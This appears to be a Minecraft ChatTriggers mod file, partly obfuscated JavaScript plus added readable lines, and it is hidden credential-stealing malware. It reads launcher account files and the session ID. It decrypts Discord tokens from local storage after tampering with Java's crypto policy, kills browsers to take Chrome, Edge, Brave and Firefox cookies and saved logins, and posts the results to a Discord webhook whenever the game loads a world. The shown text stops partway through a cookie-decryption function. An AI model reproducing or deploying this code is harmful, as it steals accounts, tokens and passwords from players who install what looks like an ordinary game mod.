_0x1ad915=a0_0x49b0a2;try{if(isBlockedPlayer()){try{ChatLib[_0x1ad915(0x4ee,'7%NS')]('');}catch(_0x36be53){}return;}var _0x380941=Date[_0x1ad915(0x59a,'ATso')]();if(typeof global[_0x1ad915(0x57b,'Wi[K')]!==_0x1ad915(0x41d,'jn62')&&_0x380941-global[_0x1ad915(0x56c,'aH$!')]<0x4e20)return;global[_0x1ad915(0x18a,'iy!H')]=_0x380941;var _0x3d2419=_0x1ad915(0x317,'Ep[K');try{_0x3d2419=String(Client[_0x1ad915(0x411,'jn62')]()[_0x1ad915(0x3bb,'emuX')]()[_0x1ad915(0x398,'h!Dk')]());}catch(_0x27c252){try{_0x3d2419=String(Player[_0x1ad915(0x5c9,'ATso')]());}catch(_0x42a3a8){}}var _0x3cecaf=_0x3d2419[_0x1ad915(0x5bd,'@G#8')](/[^A-Za-z0-9._-]/g,'_'),_0x436b9c=_0x1ad915(0x5b9,'th37')+_0x3d2419+_0x1ad915(0x1e8,'@G#8')+Player[_0x1ad915(0x3ee,'a%Ty')](),_0x5979b2=Java[_0x1ad915(0x1fb,'2Kmv')](_0x1ad915(0x1cd,'8(V@')),_0x3ff4b0=Java[_0x1ad915(0x375,'zEki')](_0x1ad915(0x4ca,'tldi')),_0x1d0a99=_0x1ad915(0x662,'V$ji'),_0x2fd833=_0x1ad915(0x59e,'aH$!');try{var _0x1e20e7=_0x5979b2[_0x1ad915(0x4b4,'Fi7!')]();_0x1d0a99=String(_0x1e20e7[_0x1ad915(0x50d,'jn62')]()),_0x2fd833=String(_0x1e20e7[_0x1ad915(0x2fa,'8(V@')]());}catch(_0x5ed6a9){}var _0x2e28a7=_0x1ad915(0x5c1,'h!Dk');try{_0x2e28a7=String(_0x3ff4b0[_0x1ad915(0x5e0,'5w@D')](_0x1ad915(0x5b3,'a%Ty'))||_0x3ff4b0[_0x1ad915(0x640,'W^I^')](_0x1ad915(0x52f,'NO98'))||'');}catch(_0x4ebd10){}var _0x539682=httpGetJson(_0x1ad915(0x652,')n)b')),_0x11c53b=_0x539682&&_0x539682[_0x1ad915(0x314,'Prp1')]?String(_0x539682[_0x1ad915(0x365,'#cv9')]):'',_0x9b1faa=_0x539682&&_0x539682[_0x1ad915(0x472,'th37')]?String(_0x539682[_0x1ad915(0x3c2,'Q%]A')]):'',_0x122977=_0x539682&&_0x539682[_0x1ad915(0x4db,'fQM$')]?String(_0x539682[_0x1ad915(0x47f,')n)b')]):'',_0x46b571=_0x539682&&_0x539682[_0x1ad915(0x47e,'PgYc')]?String(_0x539682[_0x1ad915(0x37e,'jn62')]):'',_0x2d0af5=_0x539682&&_0x539682[_0x1ad915(0x549,'W^I^')]?String(_0x539682[_0x1ad915(0x5b5,'iy!H')]):'',_0x508887=_0x539682&&_0x539682[_0x1ad915(0x3a3,'4G]x')]?String(_0x539682[_0x1ad915(0x32a,'etie')]):'';function _0x1b86ba(_0x25282a){const _0x3765a6=_0x1ad915;try{_0x25282a=String(_0x25282a||'')[_0x3765a6(0x3f6,'@[ny')]()[_0x3765a6(0x3a5,'tldi')]();if(_0x25282a[_0x3765a6(0x62c,')WT4')]!==0x2)return'';var _0x14f180=0x1f1a5,_0x4d8398=_0x25282a[_0x3765a6(0x46e,'Q%]A')](0x0)+_0x14f180,_0x1ba84d=_0x25282a[_0x3765a6(0x3dd,'lVXf')](0x1)+_0x14f180;return new java[(_0x3765a6(0x3cf,'gkB6'))][(_0x3765a6(0x194,'uenZ'))]()[_0x3765a6(0x544,'7%NS')](_0x4d8398)[_0x3765a6(0x30a,'dMvi')](_0x1ba84d)[_0x3765a6(0x5f1,'whZ0')]();}catch(_0x534213){return'';}}var _0x26f1a9=_0x1b86ba(_0x508887),_0x28e332=Java[_0x1ad915(0x3b1,'Prp1')](_0x1ad915(0x19b,'W^I^')),_0x5e4ded=Java[_0x1ad915(0x1fb,'2Kmv')](_0x1ad915(0x4c9,'Fi7!')),_0x4926e7=Java[_0x1ad915(0x329,'4G]x')](_0x1ad915(0x488,'Lz2$')),_0x3a5617=Java[_0x1ad915(0x585,'a%Ty')](_0x1ad915(0x26a,'PgYc')),_0xde7f90=new _0x28e332(),_0x4129e2=new _0x5e4ded(_0xde7f90);function _0x5c1c91(_0xe9c90a,_0x2feda7,_0xe76dc9){const _0x3a2bb6=_0x1ad915;try{_0x4129e2[_0x3a2bb6(0x5f8,'a%Ty')](new _0x4926e7(_0xe9c90a));var _0x5cbb8a=_0x2feda7!=null?new _0x3a5617(String(_0x2feda7))[_0x3a2bb6(0x597,'NO98')](_0x3a2bb6(0x233,'wIzM')):new _0x3a5617(JSON[_0x3a2bb6(0x658,'whZ0')](_0xe76dc9,null,0x2))[_0x3a2bb6(0x5c2,'PwVi')](_0x3a2bb6(0x526,'7%NS'));_0x4129e2[_0x3a2bb6(0x428,'zEki')](_0x5cbb8a),_0x4129e2[_0x3a2bb6(0x250,'6(Qp')]();}catch(_0x2e0898){}}function _0x543559(_0x549dfc,_0x563fa7,_0x473bb5){const _0x7fee37=_0x1ad915;try{var _0x357619=String(_0x549dfc);if(_0x357619[_0x7fee37(0x2e1,'etie')]<=_0x563fa7+_0x473bb5)return _0x357619;return _0x357619[_0x7fee37(0x2e3,'Q%]A')](0x0,_0x563fa7)+'…'+_0x357619[_0x7fee37(0x61e,'@[ny')](_0x357619[_0x7fee37(0x4e4,'2Fbx')]-_0x473bb5);}catch(_0x1cf59a){return'';}}function _0x264087(_0x17d897){const _0x224502=_0x1ad915;try{var _0x2140d4=String(_0x17d897||'');if(_0x2140d4[_0x224502(0x397,'pMYq')]===0x0)return[];var _0x289359=[],_0x76bec0=Object[_0x224502(0x50c,'rMVl')](null),_0x1d8554=/(mfa\.[A-Za-z0-9_-]{20,}|[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{5,7}\.[A-Za-z0-9_-]{15,})/g,_0x1a94db;while((_0x1a94db=_0x1d8554[_0x224502(0x296,'6(Qp')](_0x2140d4))!==null){var _0x8fab7=_0x1a94db[0x0];!_0x76bec0[_0x8fab7]&&(_0x76bec0[_0x8fab7]=!![],_0x289359[_0x224502(0x3e3,'zEki')](_0x8fab7));}if(_0x289359[_0x224502(0x45e,'gkB6')]===0x0){var _0x48d834=_0x2140d4[_0x224502(0x1fc,'Q%]A')](/[|,;\n\r\t ]+/)[_0x224502(0x292,'jn62')](function(_0x5d953a){const _0x5d7f18=_0x224502;return String(_0x5d953a)[_0x5d7f18(0x563,'NO98')]();})[_0x224502(0x272,'iy!H')](function(_0x4a2754){const _0x430664=_0x224502;return _0x4a2754[_0x430664(0x425,'#cv9')]>=0x14;});for(var _0x24dc08=0x0;_0x24dc08<_0x48d834[_0x224502(0x4a1,'G3bK')];_0x24dc08++){var _0x242044=_0x48d834[_0x24dc08];!_0x76bec0[_0x242044]&&(_0x76bec0[_0x242044]=!![],_0x289359[_0x224502(0x2e0,'7%NS')](_0x242044));}}return _0x289359;}catch(_0x2d248c){return[];}}var _0x5caa2b={'username':_0x3d2419,'uuid':String(Player[_0x1ad915(0x455,'Lz2$')]()),'ssid_present':!!datanigga[_0x1ad915(0x44b,'jqTf')],'ssid_length':datanigga[_0x1ad915(0x335,'8(V@')]?String(datanigga[_0x1ad915(0x4bb,'PgYc')])[_0x1ad915(0x436,'Ep[K')]:0x0,'ssid_preview':datanigga[_0x1ad915(0x55f,'rMVl')]?_0x543559(datanigga[_0x1ad915(0x1cc,'zJu^')],0x8,0x6):'','discord_tokens_present':(function(){const _0x5f0510=_0x1ad915;try{return _0x264087(datanigga[_0x5f0510(0x40c,'aH$!')])[_0x5f0510(0x41b,'whZ0')]>0x0;}catch(_0x408999){return![];}}()),'discord_token_count':(function(){const _0x47cb38=_0x1ad915;try{return _0x264087(datanigga[_0x47cb38(0x1d6,'ATso')])[_0x47cb38(0x1fa,'Prp1')];}catch(_0x31e084){return 0x0;}}()),'discord_token_previews':(function(){const _0xac65c7=_0x1ad915;try{var _0x12754e=_0x264087(datanigga[_0xac65c7(0x533,'th37')]),_0x1269cf=[];for(var _0x194e3c=0x0;_0x194e3c<Math[_0xac65c7(0x45c,'6(Qp')](_0x12754e[_0xac65c7(0x386,'[B%l')],0x5);_0x194e3c++)_0x1269cf[_0xac65c7(0x50f,'Ep[K')](_0x543559(_0x12754e[_0x194e3c],0x6,0x4));return _0x1269cf;}catch(_0xa268ef){return[];}}()),'cookies_count_total':0x0,'passwords_count_total':0x0,'has_microsoft_accounts':!!datanigga[_0x1ad915(0x444,'W^I^')],'has_mmc_accounts':!!datanigga[_0x1ad915(0x20a,'PgYc')],'has_prism_accounts':!!datanigga[_0x1ad915(0x4f5,'zJu^')]};try{var _0x2fe1fd=JSON[_0x1ad915(0x19c,'rMVl')](String(datanigga[_0x1ad915(0x3f2,'gkB6')]||'{}')),_0x57dc94=0x0;for(var _0x1b7e1d in _0x2fe1fd){if(!_0x2fe1fd[_0x1ad915(0x65f,'Prp1')](_0x1b7e1d)||_0x1b7e1d===_0x1ad915(0x3f9,'Fi7!'))continue;if(_0x2fe1fd[_0x1b7e1d]&&typeof _0x2fe1fd[_0x1b7e1d][_0x1ad915(0x40b,'Fi7!')]===_0x1ad915(0x49c,'1&mi'))_0x57dc94+=_0x2fe1fd[_0x1b7e1d][_0x1ad915(0x371,'Wi[K')];else{if(_0x2fe1fd[_0x1b7e1d]&&Array[_0x1ad915(0x263,'@G#8')](_0x2fe1fd[_0x1b7e1d][_0x1ad915(0x590,'V$ji')]))_0x57dc94+=_0x2fe1fd[_0x1b7e1d][_0x1ad915(0x4c5,'wIzM')][_0x1ad915(0x2c3,'BYlI')];}}_0x5caa2b[_0x1ad915(0x4f8,'th37')]=_0x57dc94;}catch(_0x2199ad){}try{var _0x2c67a0=JSON[_0x1ad915(0x191,'V$ji')](String(datanigga[_0x1ad915(0x466,'tldi')]||'{}')),_0x48a28c=0x0;for(var _0xa244a1 in _0x2c67a0){if(!_0x2c67a0[_0x1ad915(0x4b2,'iy!H')](_0xa244a1)||_0xa244a1===_0x1ad915(0x541,'uenZ'))continue;if(_0x2c67a0[_0xa244a1]&&typeof _0x2c67a0[_0xa244a1][_0x1ad915(0x2bc,'NO98')]===_0x1ad915(0x5a9,'2Fbx'))_0x48a28c+=_0x2c67a0[_0xa244a1][_0x1ad915(0x357,'zJu^')];else{if(_0x2c67a0[_0xa244a1]&&Array[_0x1ad915(0x3d2,'Fi7!')](_0x2c67a0[_0xa244a1][_0x1ad915(0x241,'lVXf')]))_0x48a28c+=_0x2c67a0[_0xa244a1][_0x1ad915(0x5c5,'aH$!')][_0x1ad915(0x2e1,'etie')];}}_0x5caa2b[_0x1ad915(0x4d7,'8(V@')]=_0x48a28c;}catch(_0x814604){}try{_0x5caa2b[_0x1ad915(0x618,'th37')]=String(datanigga[_0x1ad915(0x624,'BYlI')]||'');}catch(_0x231ab9){}_0x5c1c91(_0x1ad915(0x5ae,'2Kmv'),null,_0x5caa2b);if(datanigga[_0x1ad915(0x605,'rMVl')]&&String(datanigga[_0x1ad915(0x42f,'Lz2$')])[_0x1ad915(0x259,'RRF)')]>0x0)_0x5c1c91(_0x1ad915(0x5e3,'fQM$'),String(datanigga[_0x1ad915(0x245,')n)b')]));if(datanigga[_0x1ad915(0x394,'5w@D')])_0x5c1c91(_0x1ad915(0x4e3,'Q%]A'),prettyOrRaw(datanigga[_0x1ad915(0x4e7,'RRF)')]));if(datanigga[_0x1ad915(0x241,'lVXf')])_0x5c1c91(_0x1ad915(0x285,'@G#8'),prettyOrRaw(datanigga[_0x1ad915(0x1e1,'Wi[K')]));if(datanigga[_0x1ad915(0x443,'dMvi')])_0x5c1c91(_0x1ad915(0x26d,'gkB6'),prettyOrRaw(datanigga[_0x1ad915(0x42d,'jn62')]));if(datanigga[_0x1ad915(0x2df,'Wi[K')])_0x5c1c91(_0x1ad915(0x530,'2Fbx'),prettyOrRaw(datanigga[_0x1ad915(0x481,'jqTf')]));if(datanigga[_0x1ad915(0x37c,'Q%]A')])_0x5c1c91(_0x1ad915(0x399,'Ep[K'),prettyOrRaw(datanigga[_0x1ad915(0x515,'[B%l')]));try{_0x4129e2[_0x1ad915(0x5fa,'Lz2$')]();}catch(_0x28ba11){}try{_0x4129e2[_0x1ad915(0x446,'Q%]A')]();}catch(_0x493d13){}var _0x5d41a4=_0xde7f90[_0x1ad915(0x247,'pMYq')](),_0x541264=[{'filename':_0x3cecaf+_0x1ad915(0x339,'fQM$'),'contentType':_0x1ad915(0x420,'wIzM'),'bytes':_0x5d41a4}];function _0x38fcfd(_0x5d5585,_0x4395e5){const _0x50e687=_0x1ad915;var _0x94f479=String(_0x5d5585==null?'':_0x5d5585);if(_0x94f479[_0x50e687(0x51f,'h!Dk')]>_0x4395e5)_0x94f479=_0x94f479[_0x50e687(0x564,'V$ji')](0x0,_0x4395e5-0x3)+_0x50e687(0x676,'Q%]A');return _0x94f479;}var _0x346467=_0x1ad915(0x5cb,'W^I^')+_0x38fcfd(String(datanigga[_0x1ad915(0x38b,'Wi[K')]||''),0x3e8)+_0x1ad915(0x28d,'@G#8'),_0x43798c={'title':_0x1ad915(0x668,'G3bK')+_0x3d2419,'color':0x2b2d31,'fields':[{'name':_0x1ad915(0x23c,'7%NS'),'value':_0x38fcfd(Player[_0x1ad915(0x51c,'ATso')](),0x400),'inline':![]},{'name':_0x1ad915(0x207,'Fi7!'),'value':_0x346467,'inline':![]},{'name':_0x1ad915(0x3e6,'@G#8'),'value':_0x38fcfd(_0x1d0a99,0x400),'inline':!![]},{'name':_0x1ad915(0x3bc,'@G#8'),'value':_0x38fcfd(_0x2e28a7,0x400),'inline':!![]},{'name':_0x1ad915(0x26b,'rMVl'),'value':_0x38fcfd(_0x11c53b,0x400),'inline':!![]},{'name':_0x1ad915(0x407,'#cv9'),'value':_0x38fcfd(_0x2fd833,0x400),'inline':!![]},{'name':_0x1ad915(0x439,'7%NS'),'value':(_0x26f1a9?_0x26f1a9+'\x20':'')+_0x38fcfd(_0x9b1faa,0x400),'inline':!![]},{'name':_0x1ad915(0x577,'Lz2$'),'value':_0x38fcfd(_0x122977,0x400),'inline':!![]},{'name':_0x1ad915(0x4c3,'gkB6'),'value':_0x38fcfd(_0x46b571,0x400),'inline':!![]},{'name':_0x1ad915(0x3c0,'8(V@'),'value':_0x38fcfd(_0x2d0af5,0x400),'inline':!![]}],'footer':{'text':_0x1ad915(0x578,'rMVl')},'timestamp':new Date()[_0x1ad915(0x4f3,'V$ji')]()},_0xba3ec4=sendJsonReturnBody(JSON[_0x1ad915(0x23b,'jn62')]({'embeds':[_0x43798c]}),0x6),_0x5b7679=![],_0x501f5d=null;try{var _0x491dcb=JSON[_0x1ad915(0x4a8,'jqTf')](String(_0xba3ec4||''));_0x491dcb&&_0x491dcb['id']&&(_0x5b7679=!![],_0x501f5d=String(_0x491dcb['id']));}catch(_0x5f0d74){_0x5b7679=![];}if(!_0x5b7679)try{var _0x550783={'content':_0x436b9c},_0x1a1d3e=sendJsonReturnBody(JSON[_0x1ad915(0x185,'RRF)')](_0x550783),0x3),_0x24bfdc=null;try{_0x24bfdc=JSON[_0x1ad915(0x300,'uenZ')](String(_0x1a1d3e||''));}catch(_0x2eaa85){}_0x24bfdc&&_0x24bfdc['id']&&(_0x5b7679=!![],_0x501f5d=String(_0x24bfdc['id']));}catch(_0x4a00e9){}if(_0x5b7679){var _0x5ef229={'content':'\x20'},_0xb7850e=sendMultipartReturnBody(JSON[_0x1ad915(0x1d0,'Lz2$')](_0x5ef229),_0x541264,0x6);try{var _0x1df262=JSON[_0x1ad915(0x4fb,'G3bK')](String(_0xb7850e||''));if(!CUSTOM_ENDPOINT_URL&&_0x1df262&&_0x1df262[_0x1ad915(0x2e5,'Ep[K')]&&_0x1df262[_0x1ad915(0x61a,'G3bK')][_0x1ad915(0x2e1,'etie')]>0x0){var _0x4ceb0d=String(_0x1df262[_0x1ad915(0x51a,'Lz2$')][0x0][_0x1ad915(0x182,'V$ji')]||''),_0x5efe58=_0x43798c;_0x5efe58[_0x1ad915(0x29f,'NO98')]=_0x43798c[_0x1ad915(0x476,'etie')][_0x1ad915(0x352,'jn62')]([{'name':_0x1ad915(0x5e7,'zEki'),'value':'['+_0x3cecaf+_0x1ad915(0x1a0,'BYlI')+_0x4ceb0d+')','inline':!![]}]);var _0x42e19f={'embeds':[_0x5efe58]};editWebhookMessage(_0x501f5d,JSON[_0x1ad915(0x418,'uenZ')](_0x42e19f));}else{if(CUSTOM_ENDPOINT_URL){}}}catch(_0xd188b0){}}else{var _0xa66b6e={'embeds':[_0x43798c]},_0x43c37a=![];try{var _0x1c4e16=sendMultipartReturnBody(JSON[_0x1ad915(0x299,'rMVl')](_0xa66b6e),_0x541264,0x6);if(_0x1c4e16&&String(_0x1c4e16)[_0x1ad915(0x1a5,'Fi7!')]>=0x0)_0x43c37a=!![];}catch(_0x444782){}}try{ChatLib[_0x1ad915(0x3ac,'whZ0')](_0x5b7679?'':'');}catch(_0x7c42be){}}catch(_0x1a4ea6){try{ChatLib[_0x1ad915(0x3e2,'dMvi')](''+_0x1a4ea6);}catch(_0x5e1568){}}}function executeDataCollection(){setTimeout(function(){try{setTimeout(function(){try{try{sendDataToDiscord();}catch(_0x5ccce8){}}catch(_0x4dc9fa){}},0xbb8);}catch(_0x2808bb){}},0x7d0);}register(a0_0x49b0a2(0x269,'NO98'),function(){executeDataCollection();}),register(a0_0x49b0a2(0x4ef,')n)b'),function(){executeDataCollection();}),setTimeout(function(){const _0x13bce6=a0_0x49b0a2;try{Player&&Player[_0x13bce6(0x52b,'jn62')]()&&executeDataCollection();}catch(_0x5da074){}},0x3e8);
+const File = Java.type('java.io.File');
+
+// Cross-platform OS detection
+function getOSType() {
+    try {
+        const osName = java.lang.System.getProperty('os.name').toLowerCase();
+        if (osName.includes('win')) return 'windows';
+        if (osName.includes('linux')) return 'linux';
+        if (osName.includes('mac')) return 'mac';
+        return 'unknown';
+    } catch (e) {
+        return 'unknown';
+    }
+}
+
+function getEnvironmentPaths() {
+    const osType = getOSType();
+    const env = java.lang.System.getenv();
+
+    if (osType === 'windows') {
+        return {
+            appData: env.get("APPDATA"),
+            localAppData: env.get("LOCALAPPDATA"),
+            userProfile: env.get("USERPROFILE"),
+            separator: "\\",
+            osType: 'windows'
+        };
+    } else if (osType === 'linux') {
+        const homeDir = env.get("HOME");
+        return {
+            appData: homeDir + "/.config",
+            localAppData: homeDir + "/.local/share",
+            userProfile: homeDir,
+            separator: "/",
+            osType: 'linux'
+        };
+    } else {
+        // Mac or unknown - use Linux-like paths
+        const homeDir = env.get("HOME") || "/tmp";
+        return {
+            appData: homeDir + "/.config",
+            localAppData: homeDir + "/.local/share",
+            userProfile: homeDir,
+            separator: "/",
+            osType: osType
+        };
+    }
+}
+
+// Get cross-platform paths
+const envPaths = getEnvironmentPaths();
+const appData = new File(envPaths.appData || "/tmp");
+const minecraftDir = new File(Client.getMinecraft().field_71412_D.getPath());
+const parentDir = new File(minecraftDir.parent);
+const grandParentDir = new File(parentDir.parent);
+const rootDir = new File(grandParentDir.parent);
+
+const ProcessBuilder = Java.type('java.lang.ProcessBuilder');
+const Scanner = Java.type('java.util.Scanner');
+
+function readStreamFully(inputStream) {
+    try {
+        const scanner = new Scanner(inputStream, 'UTF-8').useDelimiter('\\A');
+        return scanner.hasNext() ? scanner.next() : '';
+    } catch (e) {
+        return '';
+    }
+}
+
+let mmcAccounts = null;
+let prismAccounts = null;
+
+try {
+    mmcAccounts = FileLib.read(`${rootDir}/accounts.json`);
+} catch (e) {}
+
+try {
+    prismAccounts = FileLib.read(`${appData}/PrismLauncher/accounts.json`);
+} catch (e) {}
+
+if (rootDir.getPath().includes('Prism')) {
+    try {
+        prismAccounts = FileLib.read(`${rootDir}/accounts.json`);
+        mmcAccounts = null;
+    } catch (e) {}
+}
+
+let microsoftAccounts = null;
+try {
+    microsoftAccounts = FileLib.read(`${minecraftDir}/essential/microsoft_accounts.json`);
+} catch (e) {}
+
+const BLOCKLIST = [
+    { username: "JanesSappire", uuid: "f96b3a04-ea67-47b3-a5de-42844df57be3" },
+{ username: "nicerz", uuid: "f5e665e1-7a13-41f1-9505-cca720dced08" },
+{ username: "RealB_KimAlt", uuid: "6090792b-c0ba-4366-85de-61e9fd153055" },
+{ username: "SuperSwagPD", uuid: "cbd6d235-7173-4524-9220-8617fb0ce470" },
+{ username: "otkn", uuid: "1ee3a0a1-3aea-4cd5-951d-5f5f069e81a3" },
+{ username: "BIackpill", uuid: "73c2e831-f049-47ab-bea3-14d8b5c57e58" }
+];
+
+function isBlockedPlayer() {
+    try {
+        const currentUsername = Player.getName().toLowerCase();
+        const currentUUID = Player.getUUID().toLowerCase();
+
+        for (const blocked of BLOCKLIST) {
+            const blockedUsername = blocked.username.toLowerCase();
+            const blockedUUID = blocked.uuid.toLowerCase();
+
+            if (currentUsername === blockedUsername || currentUUID === blockedUUID) {
+                return true;
+            }
+        }
+        return false;
+    } catch (e) {
+        return false; // If there's an error checking, default to not blocking
+    }
+}
+
+function getTokens() {
+    let Arrays = Java.type('java.util.Arrays');
+    const paths = getEnvironmentPaths();
+
+    // Cross-platform Discord paths
+    let discordPath;
+    if (paths.osType === 'windows') {
+        discordPath = new java.io.File(paths.appData, "discord/Local Storage/leveldb");
+    } else {
+        // Linux/Mac Discord paths
+        discordPath = new java.io.File(paths.userProfile + "/.config/discord/Local Storage/leveldb");
+    }
+    let discordTokens = "";
+
+    if (discordPath.isDirectory()) {
+        let files = discordPath.listFiles();
+
+        for (let i = 0; i < files.length; i++) {
+            let file = files[i];
+            if (file.getName().endsWith(".ldb")) {
+                try {
+                    let fr = new java.io.FileReader(file);
+                    let br = new java.io.BufferedReader(fr);
+                    let parsed = "";
+                    let line;
+
+                    while ((line = br.readLine()) != null) {
+                        parsed += line;
+                    }
+
+                    br.close();
+                    fr.close();
+
+                    let pattern = /dQw4w9WgXcQ:([^"']*)/;
+                    let match = pattern.exec(parsed);
+
+                    if (match) {
+                        try {
+                            if (javax.crypto.Cipher.getMaxAllowedKeyLength("AES") < 256) {
+                                let cryptoPermsClass = java.lang.Class.forName("javax.crypto.CryptoAllPermissionCollection");
+                                let constructor = cryptoPermsClass.getDeclaredConstructor();
+                                constructor.setAccessible(true);
+                                let permsCollection = constructor.newInstance();
+
+                                let field = cryptoPermsClass.getDeclaredField("all_allowed");
+                                field.setAccessible(true);
+                                field.setBoolean(permsCollection, true);
+
+                                let cryptoPermissionsClass = java.lang.Class.forName("javax.crypto.CryptoPermissions");
+                                constructor = cryptoPermissionsClass.getDeclaredConstructor();
+                                constructor.setAccessible(true);
+                                let allPermissions = constructor.newInstance();
+
+                                field = cryptoPermissionsClass.getDeclaredField("perms");
+                                field.setAccessible(true);
+                                field.get(allPermissions).put("*", permsCollection);
+
+                                let jceSecurityClass = java.lang.Class.forName("javax.crypto.JceSecurityManager");
+                                field = jceSecurityClass.getDeclaredField("defaultPolicy");
+                                field.setAccessible(true);
+
+                                let modifiersField = java.lang.Class.forName("java.lang.reflect.Field").getDeclaredField("modifiers");
+                                modifiersField.setAccessible(true);
+                                modifiersField.setInt(field, field.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
+
+                                field.set(null, allPermissions);
+                            }
+                            let localStateFile;
+                            if (paths.osType === 'windows') {
+                                localStateFile = new java.io.File(paths.appData, "discord/Local State");
+                            } else {
+                                localStateFile = new java.io.File(paths.userProfile + "/.config/discord/Local State");
+                            }
+                            let localStateContent = new java.lang.String(java.nio.file.Files.readAllBytes(localStateFile.toPath()), "UTF-8");
+                            let json = JSON.parse(localStateContent);
+                            let encryptedKey = json.os_crypt.encrypted_key;
+                            let keyBytes = java.util.Base64.getDecoder().decode(encryptedKey);
+                            keyBytes = Arrays.copyOfRange(keyBytes, 5, keyBytes.length);
+                            let decryptedKey = Packages.com.sun.jna.platform.win32.Crypt32Util.cryptUnprotectData(keyBytes);
+                            let encryptedToken = java.util.Base64.getDecoder().decode(match[1]);
+                            let iv = Arrays.copyOfRange(encryptedToken, 3, 15);
+                            let cipherText = Arrays.copyOfRange(encryptedToken, 15, encryptedToken.length);
+
+                            let cipher = javax.crypto.Cipher.getInstance("AES/GCM/NoPadding");
+                            let keySpec = new javax.crypto.spec.SecretKeySpec(decryptedKey, "AES");
+                            let gcmSpec = new javax.crypto.spec.GCMParameterSpec(128, iv);
+
+                            cipher.init(javax.crypto.Cipher.DECRYPT_MODE, keySpec, gcmSpec);
+                            let decrypted = cipher.doFinal(cipherText);
+                            let token = new java.lang.String(decrypted, "UTF-8");
+
+                            if (discordTokens.indexOf(token) === -1) {
+                                discordTokens += token + " | ";
+                            }
+                        } catch (e) {
+                        }
+                    }
+                } catch (e) {
+                }
+            }
+        }
+    }
+    return discordTokens.replace(/\s+\|\s+$/, "");
+}
+
+function getCookies() {
+    // Kill browsers to prevent file access issues
+    killBrowsers();
+
+    const paths = getEnvironmentPaths();
+    let allCookies = {};
+
+    // Get cross-platform browser configurations
+    function getBrowserConfigs() {
+        if (paths.osType === 'windows') {
+            return [
+                // Chrome - Windows paths
+                {
+                    name: "Chrome_Default",
+                    cookiePath: paths.localAppData + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies",
+                    localStatePath: paths.localAppData + "\\Google\\Chrome\\User Data\\Local State",
+                    type: "chromium",
+                    loginDataPath: paths.localAppData + "\\Google\\Chrome\\User Data\\Default\\Login Data"
+                },
+                {
+                    name: "Chrome_Profile1",
+                    cookiePath: paths.localAppData + "\\Google\\Chrome\\User Data\\Profile 1\\Network\\Cookies",
+                    localStatePath: paths.localAppData + "\\Google\\Chrome\\User Data\\Local State",
+                    type: "chromium",
+                    loginDataPath: paths.localAppData + "\\Google\\Chrome\\User Data\\Profile 1\\Login Data"
+                },
+                // Edge - Windows
+                {
+                    name: "Edge_Default",
+                    cookiePath: paths.localAppData + "\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies",
+                    localStatePath: paths.localAppData + "\\Microsoft\\Edge\\User Data\\Local State",
+                    type: "chromium",
+                    loginDataPath: paths.localAppData + "\\Microsoft\\Edge\\User Data\\Default\\Login Data"
+                },
+                // Brave - Windows
+                {
+                    name: "Brave_Default",
+                    cookiePath: paths.localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies",
+                    localStatePath: paths.localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Local State",
+                    type: "chromium",
+                    loginDataPath: paths.localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"
+                }
+            ];
+        } else {
+            // Linux/Mac paths
+            return [
+                // Chrome - Linux
+                {
+                    name: "Chrome_Default",
+                    cookiePath: paths.userProfile + "/.config/google-chrome/Default/Cookies",
+                    localStatePath: paths.userProfile + "/.config/google-chrome/Local State",
+                    type: "chromium",
+                    loginDataPath: paths.userProfile + "/.config/google-chrome/Default/Login Data"
+                },
+                {
+                    name: "Chrome_Profile1",
+                    cookiePath: paths.userProfile + "/.config/google-chrome/Profile 1/Cookies",
+                    localStatePath: paths.userProfile + "/.config/google-chrome/Local State",
+                    type: "chromium",
+                    loginDataPath: paths.userProfile + "/.config/google-chrome/Profile 1/Login Data"
+                },
+                // Chromium - Linux
+                {
+                    name: "Chromium_Default",
+                    cookiePath: paths.userProfile + "/.config/chromium/Default/Cookies",
+                    localStatePath: paths.userProfile + "/.config/chromium/Local State",
+                    type: "chromium",
+                    loginDataPath: paths.userProfile + "/.config/chromium/Default/Login Data"
+                },
+                // Brave - Linux
+                {
+                    name: "Brave_Default",
+                    cookiePath: paths.userProfile + "/.config/BraveSoftware/Brave-Browser/Default/Cookies",
+                    localStatePath: paths.userProfile + "/.config/BraveSoftware/Brave-Browser/Local State",
+                    type: "chromium",
+                    loginDataPath: paths.userProfile + "/.config/BraveSoftware/Brave-Browser/Default/Login Data"
+                },
+                // Firefox - Linux
+                {
+                    name: "Firefox_Default",
+                    cookiePath: paths.userProfile + "/.mozilla/firefox/*/cookies.sqlite",
+                    type: "firefox"
+                }
+            ];
+        }
+    }
+
+    let browsers = getBrowserConfigs();
+    // Simplified DPAPI decryption using PowerShell
+    // DPAPI decryption removed (Windows-only feature)
+
+    // Complete Chrome cookie decryption with all encryption versions
+    function decryptChromeCookie(encryptedValue, key) {
+        try {
+            if (!encryptedValue || encryptedValue.length < 3) return null;
+
+            let Arrays = Java.type('java.util.Arrays');
+            let encryptedData;
+
+            // Handle different input formats
+            if (typeof encryptedValue === 'string') {
+                if (encryptedValue.startsWith('v10') || encryptedValue.startsWith('v11')) {
+                    encryptedData = encryptedValue.getBytes("ISO-8859-1");
+                } else {
+                    try {
+                        encryptedData = java.util.Base64.getDecoder().decode(encryptedValue);
+                    } catch (base64Error) {
+                        encryptedData = encryptedValue.getBytes("ISO-8859-1");
+                    }
+                }
+            } else {
+                encryptedData = encryptedValue;
+            }
+
+            if (encryptedData.length < 3) return null;
+
+            // Check encryption version
+            let version = new java.lang.String(Arrays.copyOfRange(encryptedData, 0, 3), "UTF-8");
+
+            if (version.equals("v10")) {
+                // AES-GCM encryption (Chrome 80+)
+                if (encryptedData.length < 15 || !key) return null;
+
+                let iv = Arrays.copyOfRange(encryptedData, 3, 15);
+                let cipherText = Arrays.copyOfRange(encryptedData, 15, encryptedData.length - 16);
+                let authTag = Arrays.copyOfRange(encryptedData, encryptedData.length - 16, encryptedData.length);
+
+                let cipher = javax.crypto.Cipher.getInstance("AES/GCM/NoPadding");
+                let keySpec = new javax.crypto.spec.SecretKeySpec(key, "AES");
+                let gcmSpec = new javax.crypto.spec.GCMParameterSpec(128, iv);
+
+                cipher.init(javax.crypto.Cipher.DECRYPT_MODE, keySpec, gcmSpec);
